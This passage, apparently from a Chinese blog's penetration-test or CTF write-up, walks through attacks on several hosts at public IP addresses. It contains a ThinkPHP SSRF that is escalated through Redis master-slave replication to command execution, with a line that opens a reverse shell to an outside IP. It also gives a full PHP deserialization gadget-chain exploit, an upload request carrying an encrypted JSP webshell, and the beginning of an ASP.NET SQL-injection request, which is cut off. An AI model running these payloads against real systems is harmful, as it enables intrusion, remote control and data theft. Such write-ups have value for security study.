class="hljs-string">&#x27;url&#x27;</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">httpGet</span>(<span class="hljs-variable">$url</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getname</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br><br>      <span class="hljs-variable">$name</span> = <span class="hljs-variable language_">$this</span>-&gt;request-&gt;<span class="hljs-title function_ invoke__">param</span>(<span class="hljs-string">&#x27;name&#x27;</span>);<br>      <span class="hljs-variable">$article</span> =<span class="hljs-title class_">Cache</span>::<span class="hljs-title function_ invoke__">store</span>(<span class="hljs-string">&#x27;redis&#x27;</span>)-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$name</span>);<br>      <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$article</span>);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>已经有感觉是SSRF打redis了，但是访问这个路由一直不成功</p><p>于是翻阅到日志</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402011209058.png" alt="image">​</p><p>在这个地方没有回显<code>Undefined index: argv</code>​</p><p>所以得到这个路由来访问就可以发现确实存在SSRF了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST /public/index.php/index/index/geturl HTTP/1.1<br>Host: 103.164.63.172:8081<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=0.9<br>Content-Length: 436<br>Content-Type: application/x-www-form-urlencoded<br>Upgrade-Insecure-Requests: 1<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36<br><br>url=file:///var/www/html/thinkphp/library/think/cache/driver/Redis.php<br></code></pre></td></tr></table></figure><p>支持任何协议，但是应该是权限问题导致无法读取root权限的内容</p><p>找到redis的配置为空密码</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402011209521.png">​</p><p>但是直接打Gopher死活打不进，最后尝试了主从复制终于进去了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">python2 rogue-server.py <span class="hljs-comment"># 开启恶意的redis主节点</span><br>python2 ssrf-redis.py <span class="hljs-comment"># 就是主从复制的payload</span><br>dict://127.0.0.1:6379/system.exec:<span class="hljs-string">&quot;whoami&quot;</span> <span class="hljs-comment"># RCE </span><br>dict://127.0.0.1:6379/system.rev:107.174.228.79:7979 <span class="hljs-comment"># 反弹shell</span><br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402011209717.png" alt="image">​</p><p>但是根本写不了Webshell，因为有如下权限</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402011209905.png" alt="6d34383f872f4f8574de9f8baab4f4e">​</p><p>后续的思路应该就是反弹过来SUID了</p><p>但是找了SUID发现没东西</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402011209057.png" alt="image">​</p><p>并且能写的文件都没几个，并且也不能远程下载</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402011209204.png" alt="image">​</p><p>于是用Bash写了下载函数下载了我的提权脚本上去测以下</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402011209369.png" alt="image">​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402011209560.png" alt="image">​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402011209749.png" alt="image">​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402011209901.png" alt="image">​</p><p>问了下原来是打redis缓存触发的反序列化，在这里能够看到他写了缓存的<code>get</code>​方法，将传入的内容从redis中获取并且进行反序列化(识别反序列化的头部并且跳过该头部进行反序列化(<code>think_serialize:</code>​))</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">url=&#123;&#123;urlenc(file:///var/www/html/thinkphp/library/think/cache/driver/Redis.php)&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402011209059.png" alt="image">​</p><p>那我们就可以用SSRF来写入Redis的key来通过他前面的<code>getname</code>​来触发反序列化 (参考 <a href="https://www.anquanke.com/post/id/202966#h2-6">https://www.moonsec.com/2221.html</a> )</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402011209244.png" alt="image">​</p><p>EXP</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">process</span>\<span class="hljs-title class_">pipes</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">model</span>\<span class="hljs-title">Pivot</span>;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Pipes</span></span>&#123;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Windows</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Pipes</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$files</span> = [];<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;files = [<span class="hljs-keyword">new</span> <span class="hljs-title class_">Pivot</span>()];<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">model</span>;<span class="hljs-comment">#Relation</span><br><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">db</span>\<span class="hljs-title">Query</span>;<br><span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Relation</span></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$selfRelation</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$query</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;selfRelation = <span class="hljs-literal">false</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;query = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Query</span>();<span class="hljs-comment">#class Query</span><br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">model</span>\<span class="hljs-title class_">relation</span>;<span class="hljs-comment">#OneToOne HasOne</span><br><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">model</span>\<span class="hljs-title">Relation</span>;<br><span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">OneToOne</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Relation</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">__construct</span>();<br>    &#125;<br><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HasOne</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">OneToOne</span></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$bindAttr</span> = [];<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">__construct</span>();<br>        <span class="hljs-variable language_">$this</span>-&gt;bindAttr = [<span class="hljs-string">&quot;no&quot;</span>,<span class="hljs-string">&quot;123&quot;</span>];<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">console</span>;<span class="hljs-comment">#Output</span><br><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">session</span>\<span class="hljs-title">driver</span>\<span class="hljs-title">Memcached</span>;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Output</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$handle</span> = <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$styles</span> = [];<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;handle = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Memcached</span>();<span class="hljs-comment">//目的调用其write()</span><br>        <span class="hljs-variable language_">$this</span>-&gt;styles = [<span class="hljs-string">&#x27;getAttr&#x27;</span>];<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>;<span class="hljs-comment">#Model</span><br><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">model</span>\<span class="hljs-title">relation</span>\<span class="hljs-title">HasOne</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">console</span>\<span class="hljs-title">Output</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">db</span>\<span class="hljs-title">Query</span>;<br><span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Model</span></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$append</span> = [];<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$error</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$parent</span>;<span class="hljs-comment">#修改处</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$selfRelation</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$query</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$aaaaa</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-built_in">parent</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Output</span>();<span class="hljs-comment">#Output对象,目的是调用__call()</span><br>        <span class="hljs-variable language_">$this</span>-&gt;append = [<span class="hljs-string">&#x27;getError&#x27;</span>];<br>        <span class="hljs-variable language_">$this</span>-&gt;error = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HasOne</span>();<span class="hljs-comment">//Relation子类,且有getBindAttr()</span><br>        <span class="hljs-variable language_">$this</span>-&gt;selfRelation = <span class="hljs-literal">false</span>;<span class="hljs-comment">//isSelfRelation()</span><br>        <span class="hljs-variable language_">$this</span>-&gt;query = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Query</span>();<br><br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">db</span>;<span class="hljs-comment">#Query</span><br><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">console</span>\<span class="hljs-title">Output</span>;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Query</span></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$model</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;model = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Output</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">session</span>\<span class="hljs-title class_">driver</span>;<span class="hljs-comment">#Memcached</span><br><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">cache</span>\<span class="hljs-title">driver</span>\<span class="hljs-title">File</span>;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Memcached</span></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$handler</span> = <span class="hljs-literal">null</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;handler = <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>();<span class="hljs-comment">//目的调用File-&gt;set()</span><br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">cache</span>\<span class="hljs-title class_">driver</span>;<span class="hljs-comment">#File</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">File</span></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$options</span> = [];<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$tag</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;options = [<br>        <span class="hljs-string">&#x27;expire&#x27;</span>        =&gt; <span class="hljs-number">0</span>,<br>        <span class="hljs-string">&#x27;cache_subdir&#x27;</span>  =&gt; <span class="hljs-literal">false</span>,<br>        <span class="hljs-string">&#x27;prefix&#x27;</span>        =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>        <span class="hljs-string">&#x27;path&#x27;</span>          =&gt; <span class="hljs-string">&#x27;./demo/&#x27;</span>,<br>        <span class="hljs-string">&#x27;data_compress&#x27;</span> =&gt; <span class="hljs-literal">false</span>,<br>        ];<br>        <span class="hljs-variable language_">$this</span>-&gt;tag = <span class="hljs-literal">true</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">model</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">Model</span>;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Pivot</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Model</span></span>&#123;<br><br><br>&#125;<br><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">process</span>\<span class="hljs-title">pipes</span>\<span class="hljs-title">Windows</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Windows</span>()));<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">url=dict://127.0.0.1:6379/set:think_serialize:&#123;&#123;file(path)&#125;&#125;<br></code></pre></td></tr></table></figure><p>然后再使用bitop命令Redis缓存值按位计算并获取结果保存文件名782</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/public/index.php/Index/Index/geturl?url=dict://127.0.0.1:6379/bitop:not:782:think_serialize<br></code></pre></td></tr></table></figure><p>然后再把保存的缓存文件加载到Redis内</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/public/index.php/Index/Index/getname?name=782<br></code></pre></td></tr></table></figure><h3 id="8090"><a href="#8090" class="headerlink" title="8090"></a>8090</h3><p>‍</p><p>存在开源系统</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402011209405.png" alt="image">​</p><p>发现给了账号密码登录有问题但是存在Cookie所以可以直接审计后台不需要审计前台了，直接搜索<code>upload</code>​就找到了</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402011209604.png" alt="image">​</p><p>直接传，但是传的时候会加多个目录叫<code>imgs/cockpit</code>​ 并且带着Cookie上传即可</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs xml">POST /dashboard/uploadImage HTTP/1.1<br>Host: 103.164.63.172:8090<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=0.9<br>Content-Length: 198<br>Cookie: JSESSIONID=FA8F19AB26EDEB10B32146A44AAB012F; remember-me=YWRtaW46MTcwNzM4MTYzNzcxODozNjc2ODFkMTQ0ZDY5NjcwNTRlN2NmZDhlYzQ1MTczNQ<br>Content-Type: multipart/form-data; boundary=------------------------wKoEIAUPcfhLzGHWDkMGqPvBlYybLlxvbAZNXtdi<br>Referer: http://222.194.65.173/search.php<br>Upgrade-Insecure-Requests: 1<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36<br><br>--------------------------wKoEIAUPcfhLzGHWDkMGqPvBlYybLlxvbAZNXtdi<br>Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;qwe12.jsp&quot;<br>Content-Type: image/jpeg<br><br>&lt;%! String xc = &quot;1e5334caed399aed&quot;;class X extends ClassLoader &#123;public X(ClassLoader z) &#123;super(z); &#125;public Class Q(byte[] cb) &#123;return super.defineClass(cb, 0, cb.length);&#125;&#125;public byte[] x(byte[] s, boolean m) &#123;try &#123;javax.crypto.Cipher c = javax.crypto.Cipher.getInstance(&quot;AES&quot;);Class&lt;?&gt; aClass = Class.forName(&quot;javax.crypto.spec.SecretKeySpec&quot;);java.lang.reflect.Constructor&lt;?&gt;constructor = aClass.getConstructor(byte[].class, String.class);javax.crypto.spec.SecretKeySpec skeySpec = (javax.crypto.spec.SecretKeySpec) constructor.newInstance(xc.getBytes(), &quot;AES&quot;);c.init(m ? 1 : 2, skeySpec);byte[] result = (byte[]) c.getClass()./*Zp8err57wn*/getDeclaredMethod/*Zp8err57wn*/(&quot;doFinal&quot;, new Class[]&#123;byte[].class&#125;).invoke(c, new Object[]&#123;s&#125;);return result; &#125; catch (Exception e) &#123;return null;&#125;&#125; %&gt;&lt;%  try &#123;byte[] C36o = new byte[Integer.parseInt(request.getHeader(&quot;Content-Length&quot;))]; java.io.InputStream inputStream = request.getInputStream(); int _num = 0; while ((_num += inputStream.read(C36o, _num, C36o.length)) &lt; C36o.length) ; C36o = x(C36o, false); if (session.getAttribute(&quot;payload&quot;) == null) &#123;session.setAttribute(&quot;payload&quot;, new X(Thread.currentThread()./*Zp8err57wn*/getContextClassLoader()).Q(C36o)); &#125; else &#123;request.setAttribute(&quot;parameters&quot;, C36o);Object f = ((Class) session.getAttribute(&quot;payload&quot;)).newInstance();java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();f.equals(/*Zp8err57wn*/arrOut);f.equals(/*Zp8err57wn*/pageContext);f.toString();response.getOutputStream().write(x(arrOut.toByteArray(), true)); &#125;&#125; catch (Exception e) &#123;&#125; %&gt;<br>--------------------------wKoEIAUPcfhLzGHWDkMGqPvBlYybLlxvbAZNXtdi--<br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402011209778.png" alt="image">​</p><p>拿到第一个flag</p><p>发现是docker环境(我又逃逸了好久结果没成功)</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402011209936.png" alt="image">​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402011209083.png" alt="image">​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402011209386.png" alt="image">​</p><h2 id="103-164-63-231"><a href="#103-164-63-231" class="headerlink" title="103.164.63.231"></a>103.164.63.231</h2><p>‍</p><h3 id="80"><a href="#80" class="headerlink" title="80"></a><span style="font-weight: bold;" data-type="strong">80</span></h3><p>‍</p><p>扫了下目录</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml">[10:49:24] 301 -  151B  - /admin  -&gt;  http://103.164.63.231/admin/<br>[10:49:33] 301 -  150B  - /book  -&gt;  http://103.164.63.231/book/<br>[10:49:44] 301 -  152B  - /images  -&gt;  http://103.164.63.231/images/<br>[10:49:45] 301 -  153B  - /Install  -&gt;  http://103.164.63.231/Install/<br>[10:49:47] 200 -    6KB - /login.aspx<br>[10:49:48] 301 -  147B  - /m  -&gt;  http://103.164.63.231/m/<br>[10:49:57] 200 -   13KB - /register.aspx<br>[10:49:57] 301 -  152B  - /report  -&gt;  http://103.164.63.231/report/<br>[10:50:03] 301 -  151B  - /style  -&gt;  http://103.164.63.231/style/<br>[10:50:04] 301 -  150B  - /temp  -&gt;  http://103.164.63.231/temp/<br>[10:50:04] 301 -  154B  - /template  -&gt;  http://103.164.63.231/template/<br>[10:50:06] 403 -    3KB - /Trace.axd<br>[10:50:06] 301 -  153B  - /uploads  -&gt;  http://103.164.63.231/uploads/<br><br></code></pre></td></tr></table></figure><p>可以注册，但是发现存在可疑的<code>report</code>​,点了几个功能点</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402011209562.png" alt="image">​</p><p>发现bp开到了sql的点</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402011209724.png" alt="image">​</p><p>注入点  <code>ctl00hf_roomids</code>​ 于是直接进行注入</p><p>当然先前也是给了源码的，这里其实有两个点</p><h4 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h4><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402011209007.png" alt="image">​</p><p>最直接的加载页面后自动调用了<code>this.BuildSQL();</code>​方法，然后获取<code>hf_roomids</code>​参数直接进行拼接执行</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs C#"><span class="hljs-keyword">this</span>.hf_roomids.Value = Helper.FormatIds(<span class="hljs-keyword">this</span>.hf_roomids.Value);<br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402011209403.png" alt="image">​</p><p>最后EXP</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml">POST /report/DataAnalyze.aspx HTTP/1.1<br>Host: 103.164.63.231<br>Content-Length: 1469<br>Cache-Control: max-age=0<br>Upgrade-Insecure-Requests: 1<br>Origin: http://103.164.63.231<br>Content-Type: application/x-www-form-urlencoded<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br>Referer: http://103.164.63.231/report/DataAnalyze.aspx<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=0.9<br>Connection: close<br><br>__EVENTTARGET=ctl00$cont_form$ddl_month&amp;__EVENTARGUMENT=&amp;__LASTFOCUS=&amp;__VIEWSTATE=/wEPDwUKMTM3Njc5NjU0OA9kFgJmD2QWAgIHD2QWAgIBD2QWCgIBDxBkDxYIZgIBAgICAwIEAgUCBgIHFggQBQQyMDE5BQQyMDE5ZxAFBDIwMjAFBDIwMjBnEAUEMjAyMQUEMjAyMWcQBQQyMDIyBQQyMDIyZxAFBDIwMjMFBDIwMjNnEAUEMjAyNAUEMjAyNGcQBQQyMDI1BQQyMDI1ZxAFBDIwMjYFBDIwMjZnFgECBWQCAw8QZA8WDGYCAQICAgMCBAIFAgYCBwIIAgkCCgILFgwQBQExBQExZxAFATIFATJnEAUBMwUBM2cQBQE0BQE0ZxAFATUFATVnEAUBNgUBNmcQBQE3BQE3ZxAFATgFAThnEAUBOQUBOWcQBQIxMAUCMTBnEAUCMTEFAjExZxAFAjEyBQIxMmcWAWZkAhUPFgIeC18hSXRlbUNvdW50AgUWCgIBD2QWAmYPFQQIQkogUm9vbTECMjABMQExZAICD2QWAmYPFQQIQkogUm9vbTICMTABMgEyZAIDD2QWAmYPFQQIQkogUm9vbTMCNTABMwEzZAIED2QWAmYPFQQIU0ggUm9vbTECMTABNAE0ZAIFD2QWAmYPFQQIU0ggUm9vbTICMjABNQE1ZAIXDxYCHwACAxYGAgEPZBYCZg8VAwnlhavniKrpsbwBMABkAgIPZBYCZg8VAwblkpbllaEBMABkAgMPZBYCZg8VAwbpspzoirEBMABkAhkPFgIfAAICFgQCAQ9kFgJmDxUDDOWGhemDqOS8muiurgEwAGQCAg9kFgJmDxUDDOWklumDqOS8muiurgEwAGRkA3L1ts3K/VQiXHAwGrArU2npVvTb2dKu/BkIiIfXiXk=&amp;ctl00$cont_form$ddl_year=2024&amp;ctl00$cont_form$ddl_month=3&amp;ctl00$cont_form$hf_hours=,,,,,&amp;ctl00$cont_form$hf_it=八爪鱼,咖啡,鲜花&amp;ctl00$cont_form$hf_admin=内部会议,外部会议&amp;ct